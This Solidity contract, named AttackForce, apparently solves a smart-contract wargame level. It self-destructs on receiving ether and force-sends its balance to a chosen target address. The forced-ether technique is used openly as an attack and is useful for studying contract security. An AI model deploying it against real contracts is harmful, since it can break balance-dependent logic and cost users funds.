// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackForce {

    address payable public target;
    constructor(address payable _target) {
        target = _target;
    }

    receive() external payable {
        selfdestruct(target);
    }
}